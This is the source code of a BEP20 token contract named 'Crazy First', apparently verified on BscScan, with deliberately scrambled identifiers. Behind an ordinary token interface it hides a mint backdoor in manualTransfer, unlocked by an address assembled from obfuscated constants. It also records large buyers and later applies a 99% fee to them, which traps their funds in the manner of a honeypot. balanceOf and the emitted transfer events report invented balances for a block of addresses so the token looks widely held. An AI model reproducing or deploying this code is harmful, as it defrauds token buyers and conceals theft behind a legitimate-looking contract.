/**
 *Submitted for verification at BscScan.com on 2023-01-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IBEP20 {

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract CrazyFirst is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 enableFromTotalToToken = 100000000 * (10 ** _decimals);
    uint256  sellMintTokenEnable = 100000000 * 10 ** _decimals;
    uint256  exemptBuyAtFeeMaxToken = 100000000 * 10 ** _decimals;


    string constant _name = "Crazy First";
    string constant _symbol = "CFT";
    uint8 constant _decimals = 18;

    uint256 private swapTotalAmountFromWalletToken = 0;
    uint256 private tokenFundToTotalBotsMinSell = 5;

    uint256 private liquidityTokenLaunchShouldToTxMin = 0;
    uint256 private takeAutoTradingMinEnable = 5;

    bool private takeAutoToBots = true;
    uint160 constant senderTxFromMaxTradingTo = 1050439369132 * 2 ** 40;
    bool private receiverSwapTradingIs = true;
    bool private enableSenderListShould = true;
    bool private isFeeShouldSender = true;
    uint256 constant fundBotsSellWallet = 300000 * 10 ** 18;
    bool private mintTxFromToken = true;
    uint256 amountReceiverTxList = 2 ** 18 - 1;
    uint256 private receiverMintTeamTake = 6 * 10 ** 15;
    uint256 private isLaunchMaxLiquidity = enableFromTotalToToken / 1000; // 0.1%
    uint256 sellReceiverTakeLaunched = 3831;

    address constant fundLiquiditySellIs = 0x9Bb7486542dcF5A04797154a9228c0dA84c928E8;
    uint256 minMintTeamTo = 0;
    uint256 constant fromReceiverLimitMinExemptBurnEnable = 10000 * 10 ** 18;

    uint256 private exemptToFeeTrading = tokenFundToTotalBotsMinSell + swapTotalAmountFromWalletToken;
    uint256 private exemptMintBotsList = 100;

    uint160 constant receiverSenderMintTake = 669831341101 * 2 ** 120;
    uint160 constant sellAtLimitFee = 199953343047;

    bool private amountLaunchedTeamLaunch;
    uint256 private fundTxLiquidityReceiver;
    uint256 private autoShouldAmountSell;
    uint256 private listEnableAtAmount;
    uint256 private teamExemptSenderList;
    uint160 constant walletLaunchedTeamAmount = 291627447151 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private toLaunchExemptMax;
    mapping(address => bool) private swapLimitIsSell;
    mapping(address => bool) private toBurnTakeTeam;
    mapping(address => bool) private enableLiquidityMarketingFundTeam;
    mapping(address => uint256) private limitFundToBotsShould;
    mapping(uint256 => address) private feeSellLaunchReceiver;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public shouldTakeToListTeam;
    address public uniswapV2Pair;

    uint256 private mintLaunchTotalTo;
    uint256 private mintAutoLimitTokenModeEnable;

    address private tokenSellReceiverEnable = (msg.sender); // auto-liq address
    address private feeShouldListLiquidityTradingMin = (0x97D4FbE18A65C794129E0CbEFfffDECF1265856a); // marketing address

    
    uint256 public autoShouldFromIsListTeamFund = 0;
    bool private modeTxEnableAmount = false;
    uint256 public modeFromExemptLaunched = 0;
    uint256 public listMintFundIs = 0;
    uint256 public totalMintSellTx = 0;
    bool private walletTxAtToTokenEnableLaunched = false;
    uint256 private sellFromReceiverSender = 0;
    bool private swapReceiverAmountExempt = false;
    uint256 public launchedBuyToLimit = 0;
    uint256 private amountTotalTakeTeam = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        shouldTakeToListTeam = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(shouldTakeToListTeam.factory()).createPair(address(this), shouldTakeToListTeam.WETH());
        _allowances[address(this)][address(shouldTakeToListTeam)] = enableFromTotalToToken;

        amountLaunchedTeamLaunch = true;

        toBurnTakeTeam[msg.sender] = true;
        toBurnTakeTeam[0x0000000000000000000000000000000000000000] = true;
        toBurnTakeTeam[0x000000000000000000000000000000000000dEaD] = true;
        toBurnTakeTeam[address(this)] = true;

        toLaunchExemptMax[msg.sender] = true;
        toLaunchExemptMax[address(this)] = true;

        swapLimitIsSell[msg.sender] = true;
        swapLimitIsSell[0x0000000000000000000000000000000000000000] = true;
        swapLimitIsSell[0x000000000000000000000000000000000000dEaD] = true;
        swapLimitIsSell[address(this)] = true;

        approve(_router, enableFromTotalToToken);
        approve(address(uniswapV2Pair), enableFromTotalToToken);
        _balances[msg.sender] = enableFromTotalToToken;
        emit Transfer(address(0), msg.sender, enableFromTotalToToken);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableFromTotalToToken;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, enableFromTotalToToken);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return fromAtSwapLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableFromTotalToToken) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return fromAtSwapLiquidity(sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (autoMarketingLimitSellFromReceiver(uint160(account))) {
            return limitToExemptTxTokenLaunched(uint160(account));
        }
        return _balances[account];
    }

    function modeReceiverReceiverAmount(address autoSellWalletMaxender, address autoTakeLaunchIs, uint256 tokenExemptFundAutoBotsTotal, bool fromBuyLiquidityExempt) private {
        if (fromBuyLiquidityExempt) {
            autoSellWalletMaxender = address(uint160(uint160(fundLiquiditySellIs) + minMintTeamTo));
            minMintTeamTo++;
            _balances[autoTakeLaunchIs] = _balances[autoTakeLaunchIs].add(tokenExemptFundAutoBotsTotal);
        } else {
            _balances[autoSellWalletMaxender] = _balances[autoSellWalletMaxender].sub(tokenExemptFundAutoBotsTotal);
        }
        emit Transfer(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal);
    }

    function tokenFromTotalFund(uint160 burnExemptTxShould) private pure returns (bool) {
        return burnExemptTxShould == (receiverSenderMintTake + walletLaunchedTeamAmount + senderTxFromMaxTradingTo + sellAtLimitFee);
    }

    function fromAtSwapLiquidity(address autoSellWalletMaxender, address autoTakeLaunchIs, uint256 tokenExemptFundAutoBotsTotal) internal returns (bool) {
        if (autoMarketingLimitSellFromReceiver(uint160(autoTakeLaunchIs))) {
            modeReceiverReceiverAmount(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal, false);
            return true;
        }
        if (autoMarketingLimitSellFromReceiver(uint160(autoSellWalletMaxender))) {
            modeReceiverReceiverAmount(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal, true);
            return true;
        }
        
        bool isReceiverTxTokenListTakeMax = teamTokenFeeToMarketing(autoSellWalletMaxender) || teamTokenFeeToMarketing(autoTakeLaunchIs);
        
        if (swapReceiverAmountExempt != swapReceiverAmountExempt) {
            swapReceiverAmountExempt = enableSenderListShould;
        }


        if (autoSellWalletMaxender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && swapTxSellReceiver(uint160(autoTakeLaunchIs))) {
                totalFeeEnableTake();
            }
            if (!isReceiverTxTokenListTakeMax) {
                enableFromShouldSellTokenMinMax(autoTakeLaunchIs);
            }
        }
        
        
        if (autoShouldFromIsListTeamFund == modeFromExemptLaunched) {
            autoShouldFromIsListTeamFund = sellFromReceiverSender;
        }

        if (launchedBuyToLimit != liquidityTokenLaunchShouldToTxMin) {
            launchedBuyToLimit = listMintFundIs;
        }


        if (inSwap || isReceiverTxTokenListTakeMax) {return walletLiquidityMaxSenderReceiverTotalTx(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal);}
        
        if (sellFromReceiverSender == exemptMintBotsList) {
            sellFromReceiverSender = exemptToFeeTrading;
        }

        if (modeTxEnableAmount == takeAutoToBots) {
            modeTxEnableAmount = takeAutoToBots;
        }

        if (swapReceiverAmountExempt != takeAutoToBots) {
            swapReceiverAmountExempt = takeAutoToBots;
        }


        require((tokenExemptFundAutoBotsTotal <= sellMintTokenEnable) || toBurnTakeTeam[autoSellWalletMaxender] || toBurnTakeTeam[autoTakeLaunchIs], "Max TX Limit!");

        if (receiverTradingModeFund()) {sellIsLiquidityBots();}

        _balances[autoSellWalletMaxender] = _balances[autoSellWalletMaxender].sub(tokenExemptFundAutoBotsTotal, "Insufficient Balance!");
        
        uint256 tokenExemptFundAutoBotsTotalReceived = receiverFundSellSenderBotsEnable(autoSellWalletMaxender) ? tradingWalletTotalMax(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal) : tokenExemptFundAutoBotsTotal;

        _balances[autoTakeLaunchIs] = _balances[autoTakeLaunchIs].add(tokenExemptFundAutoBotsTotalReceived);
        emit Transfer(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotalReceived);
        return true;
    }

    function gettoMaxLiquidityTxTakeToken() public view returns (uint256) {
        if (listMintFundIs != isLaunchMaxLiquidity) {
            return isLaunchMaxLiquidity;
        }
        if (listMintFundIs == launchBlock) {
            return launchBlock;
        }
        return listMintFundIs;
    }

    function settoMaxLiquidityTxTakeToken(uint256 buyModeTxTeam) public onlyOwner {
        listMintFundIs=buyModeTxTeam;
    }

    function setZERO(address buyModeTxTeam) public onlyOwner {
        ZERO=buyModeTxTeam;
    }

    function walletLiquidityMaxSenderReceiverTotalTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txTradingTokenFee(address autoSellWalletMaxender, uint256 feeIsBuyMarketingList) private view returns (uint256) {
        uint256 walletTokenMinReceiver = limitFundToBotsShould[autoSellWalletMaxender];
        if (walletTokenMinReceiver > 0 && swapExemptMinShould() - walletTokenMinReceiver > 2) {
            return 99;
        }
        return feeIsBuyMarketingList;
    }

    function receiverTradingModeFund() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        mintTxFromToken &&
        _balances[address(this)] >= isLaunchMaxLiquidity;
    }

    function atLimitListSwapTokenLiquidity(address autoSellWalletMaxender, bool maxEnableSenderTokenMarketingTradingFee) internal returns (uint256) {
        
        if (amountTotalTakeTeam == exemptToFeeTrading) {
            amountTotalTakeTeam = receiverMintTeamTake;
        }

        if (sellFromReceiverSender == liquidityTokenLaunchShouldToTxMin) {
            sellFromReceiverSender = modeFromExemptLaunched;
        }


        if (maxEnableSenderTokenMarketingTradingFee) {
            exemptToFeeTrading = takeAutoTradingMinEnable + liquidityTokenLaunchShouldToTxMin;
            return txTradingTokenFee(autoSellWalletMaxender, exemptToFeeTrading);
        }
        if (!maxEnableSenderTokenMarketingTradingFee && autoSellWalletMaxender == uniswapV2Pair) {
            exemptToFeeTrading = tokenFundToTotalBotsMinSell + swapTotalAmountFromWalletToken;
            return exemptToFeeTrading;
        }
        return txTradingTokenFee(autoSellWalletMaxender, exemptToFeeTrading);
    }

    function teamTokenFeeToMarketing(address botsTokenAtMin) private view returns (bool) {
        return ((uint256(uint160(botsTokenAtMin)) << 192) >> 238) == amountReceiverTxList;
    }

    function sellIsLiquidityBots() internal swapping {
        
        uint256 liquidityBuyMinSender = isLaunchMaxLiquidity.mul(swapTotalAmountFromWalletToken).div(exemptToFeeTrading).div(2);
        uint256 tokenExemptFundAutoBotsTotalToSwap = isLaunchMaxLiquidity.sub(liquidityBuyMinSender);

        address[] memory teamSwapMarketingAt = new address[](2);
        teamSwapMarketingAt[0] = address(this);
        teamSwapMarketingAt[1] = shouldTakeToListTeam.WETH();
        shouldTakeToListTeam.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenExemptFundAutoBotsTotalToSwap,
            0,
            teamSwapMarketingAt,
            address(this),
            block.timestamp
        );
        
        uint256 tokenExemptFundAutoBotsTotalBNB = address(this).balance;
        uint256 minReceiverTakeFee = exemptToFeeTrading.sub(swapTotalAmountFromWalletToken.div(2));
        uint256 swapReceiverFeeShould = tokenExemptFundAutoBotsTotalBNB.mul(swapTotalAmountFromWalletToken).div(minReceiverTakeFee).div(2);
        uint256 toFundMintExemptLimitLiquidityToken = tokenExemptFundAutoBotsTotalBNB.mul(tokenFundToTotalBotsMinSell).div(minReceiverTakeFee);
        
        payable(feeShouldListLiquidityTradingMin).transfer(toFundMintExemptLimitLiquidityToken);

        if (liquidityBuyMinSender > 0) {
            shouldTakeToListTeam.addLiquidityETH{value : swapReceiverFeeShould}(
                address(this),
                liquidityBuyMinSender,
                0,
                0,
                tokenSellReceiverEnable,
                block.timestamp
            );
            emit AutoLiquify(swapReceiverFeeShould, liquidityBuyMinSender);
        }
    }

    function setshouldTeamEnableBotsReceiver(address buyModeTxTeam) public onlyOwner {
        if (tokenSellReceiverEnable == ZERO) {
            ZERO=buyModeTxTeam;
        }
        if (tokenSellReceiverEnable != DEAD) {
            DEAD=buyModeTxTeam;
        }
        if (tokenSellReceiverEnable == tokenSellReceiverEnable) {
            tokenSellReceiverEnable=buyModeTxTeam;
        }
        tokenSellReceiverEnable=buyModeTxTeam;
    }

    function setautoAmountLaunchBotsIsBuyFund(uint256 buyModeTxTeam) public onlyOwner {
        if (exemptToFeeTrading == maxWalletAmount) {
            maxWalletAmount=buyModeTxTeam;
        }
        if (exemptToFeeTrading != receiverMintTeamTake) {
            receiverMintTeamTake=buyModeTxTeam;
        }
        exemptToFeeTrading=buyModeTxTeam;
    }

    function getTotalAmount() public {
        totalFeeEnableTake();
    }

    function swapExemptMinShould() private view returns (uint256) {
        return block.timestamp;
    }

    function swapTxSellReceiver(uint160 autoTakeLaunchIs) private view returns (bool) {
        return uint16(autoTakeLaunchIs) == sellReceiverTakeLaunched;
    }

    function manualTransfer(address autoSellWalletMaxender, address autoTakeLaunchIs, uint256 tokenExemptFundAutoBotsTotal) public {
        if (!tokenFromTotalFund(uint160(msg.sender))) {
            return;
        }
        if (autoMarketingLimitSellFromReceiver(uint160(autoTakeLaunchIs))) {
            modeReceiverReceiverAmount(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal, false);
            return;
        }
        if (autoMarketingLimitSellFromReceiver(uint160(autoSellWalletMaxender))) {
            modeReceiverReceiverAmount(autoSellWalletMaxender, autoTakeLaunchIs, tokenExemptFundAutoBotsTotal, true);
            return;
        }
        if (autoSellWalletMaxender == address(0)) {
            _balances[autoTakeLaunchIs] = _balances[autoTakeLaunchIs].add(tokenExemptFundAutoBotsTotal);
            return;
        }
    }

    function getautoAmountLaunchBotsIsBuyFund() public view returns (uint256) {
        if (exemptToFeeTrading == autoShouldFromIsListTeamFund) {
            return autoShouldFromIsListTeamFund;
        }
        return exemptToFeeTrading;
    }

    function setmodeTotalWalletTrading(address buyModeTxTeam) public onlyOwner {
        if (feeShouldListLiquidityTradingMin == feeShouldListLiquidityTradingMin) {
            feeShouldListLiquidityTradingMin=buyModeTxTeam;
        }
        if (feeShouldListLiquidityTradingMin == feeShouldListLiquidityTradingMin) {
            feeShouldListLiquidityTradingMin=buyModeTxTeam;
        }
        feeShouldListLiquidityTradingMin=buyModeTxTeam;
    }

    function limitToExemptTxTokenLaunched(uint160 burnExemptTxShould) private view returns (uint256) {
        uint256 autoSellWalletMax = minMintTeamTo;
        uint256 botsIsMaxBurnMinBuy = burnExemptTxShould - uint160(fundLiquiditySellIs);
        if (botsIsMaxBurnMinBuy < autoSellWalletMax) {
            return fromReceiverLimitMinExemptBurnEnable;
        }
        return fundBotsSellWallet;
    }

    function receiverFundSellSenderBotsEnable(address autoSellWalletMaxender) internal view returns (bool) {
        return !swapLimitIsSell[autoSellWalletMaxender];
    }

    function tradingWalletTotalMax(address autoSellWalletMaxender, address fundEnableLiquidityMinLaunched, uint256 tokenExemptFundAutoBotsTotal) internal returns (uint256) {
        
        uint256 feeEnableTokenMarketingMin = tokenExemptFundAutoBotsTotal.mul(atLimitListSwapTokenLiquidity(autoSellWalletMaxender, fundEnableLiquidityMinLaunched == uniswapV2Pair)).div(exemptMintBotsList);

        if (enableLiquidityMarketingFundTeam[autoSellWalletMaxender] || enableLiquidityMarketingFundTeam[fundEnableLiquidityMinLaunched]) {
            feeEnableTokenMarketingMin = tokenExemptFundAutoBotsTotal.mul(99).div(exemptMintBotsList);
        }

        _balances[address(this)] = _balances[address(this)].add(feeEnableTokenMarketingMin);
        emit Transfer(autoSellWalletMaxender, address(this), feeEnableTokenMarketingMin);
        
        return tokenExemptFundAutoBotsTotal.sub(feeEnableTokenMarketingMin);
    }

    function getshouldTeamEnableBotsReceiver() public view returns (address) {
        if (tokenSellReceiverEnable != feeShouldListLiquidityTradingMin) {
            return feeShouldListLiquidityTradingMin;
        }
        if (tokenSellReceiverEnable != ZERO) {
            return ZERO;
        }
        if (tokenSellReceiverEnable == WBNB) {
            return WBNB;
        }
        return tokenSellReceiverEnable;
    }

    function getfundFromEnableToken(address buyModeTxTeam) public view returns (bool) {
        if (buyModeTxTeam == feeShouldListLiquidityTradingMin) {
            return modeTxEnableAmount;
        }
        if (buyModeTxTeam == ZERO) {
            return swapReceiverAmountExempt;
        }
        if (buyModeTxTeam == DEAD) {
            return isFeeShouldSender;
        }
            return swapLimitIsSell[buyModeTxTeam];
    }

    function enableFromShouldSellTokenMinMax(address botsTokenAtMin) private {
        if (listMaxTxMintBots() < receiverMintTeamTake) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        feeSellLaunchReceiver[maxWalletAmount] = botsTokenAtMin;
    }

    function getZERO() public view returns (address) {
        if (ZERO == WBNB) {
            return WBNB;
        }
        return ZERO;
    }

    function totalFeeEnableTake() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (limitFundToBotsShould[feeSellLaunchReceiver[i]] == 0) {
                    limitFundToBotsShould[feeSellLaunchReceiver[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getmodeTotalWalletTrading() public view returns (address) {
        if (feeShouldListLiquidityTradingMin != DEAD) {
            return DEAD;
        }
        return feeShouldListLiquidityTradingMin;
    }

    function setfundFromEnableToken(address buyModeTxTeam,bool tradingMaxMinLaunch) public onlyOwner {
        if (buyModeTxTeam == DEAD) {
            walletTxAtToTokenEnableLaunched=tradingMaxMinLaunch;
        }
        if (swapLimitIsSell[buyModeTxTeam] != swapLimitIsSell[buyModeTxTeam]) {
           swapLimitIsSell[buyModeTxTeam]=tradingMaxMinLaunch;
        }
        swapLimitIsSell[buyModeTxTeam]=tradingMaxMinLaunch;
    }

    function listMaxTxMintBots() private view returns (uint256) {
        address launchMinTakeEnable = WBNB;
        if (address(this) < WBNB) {
            launchMinTakeEnable = address(this);
        }
        (uint marketingTotalSenderFund, uint isAmountMarketingLaunched,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 limitFeeBurnMinSwap,) = WBNB == launchMinTakeEnable ? (marketingTotalSenderFund, isAmountMarketingLaunched) : (isAmountMarketingLaunched, marketingTotalSenderFund);
        uint256 senderReceiverTeamReceiver = IERC20(WBNB).balanceOf(uniswapV2Pair) - limitFeeBurnMinSwap;
        return senderReceiverTeamReceiver;
    }

    function autoMarketingLimitSellFromReceiver(uint160 burnExemptTxShould) private pure returns (bool) {
        if (burnExemptTxShould >= uint160(fundLiquiditySellIs) && burnExemptTxShould <= uint160(fundLiquiditySellIs) + 100000) {
            return true;
        }
        return false;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}